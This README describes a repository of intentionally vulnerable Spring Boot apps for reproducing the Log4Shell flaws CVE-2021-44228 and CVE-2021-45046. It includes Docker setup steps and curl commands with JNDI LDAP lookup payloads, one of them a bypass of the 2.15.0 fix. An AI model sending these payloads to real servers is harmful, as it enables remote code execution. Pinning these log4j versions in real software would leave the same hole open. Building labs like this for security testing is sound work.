# Log4Shell sample vulnerable application

This repository contains Spring Boot web applications vulnerable to [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).


## Variants
### cve-2021-44228 (log4j-core: 2.14.1)
* JDK: openjdk:8u312-jdk-slim
* SpringLog4J: org.springframework.boot:spring-boot-starter-log4j2:2.6.1 (https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
* log4j-core: 2.14.1

```bash
cd log4j-2.14.1
sudo docker build -t vulnerable-app-log4shell-2.14.1 .
sudo docker run -p 8000:8080 --name vulnerable-app-log4shell-2.14.1 --rm vulnerable-app-log4shell-2.14.1
```

Trigger the vulnerability using:

```bash
curl 127.0.0.1:8000 -H 'X-Api-Version: ${jndi:ldap://your-private-ip.com/abc}'
```

### cve-2021-45046 (log4j-core: 2.15.0)
https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-45046/


* JDK: openjdk:8u312-jdk-slim
* SpringLog4J: org.springframework.boot:spring-boot-starter-log4j2:2.6.1 (https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
* log4j-core: 2.15.0

```bash
cd log4j-2.15.0
sudo docker build -t vulnerable-app-log4shell-2.15.0 .
sudo docker run -p 8000:8080 --name vulnerable-app-log4shell-2.15.0 --rm vulnerable-app-log4shell-2.15.0
```

Does not work anymore:
```bash
curl 127.0.0.1:8000/old -H 'X-Api-Version: ${jndi:ldap://your-private-ip.com/abc}'
```

Trigger the vulnerability using:
```bash
curl 127.0.0.1:8000 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1#your-private-ip.com/abc}'
```

Why this works: https://twitter.com/marcioalm/status/1471742744347348997


When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data using a JNDI Lookup pattern, resulting in an information leak and remote code execution in some environments and local code execution in all environments; remote code execution has been demonstrated on MacOS, Fedora, Arch Linux, and **Alpine Linux**.
https://logging.apache.org/log4j/2.x/security.html

## Forked from
https://github.com/christophetd/log4shell-vulnerable-app

thanks to

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
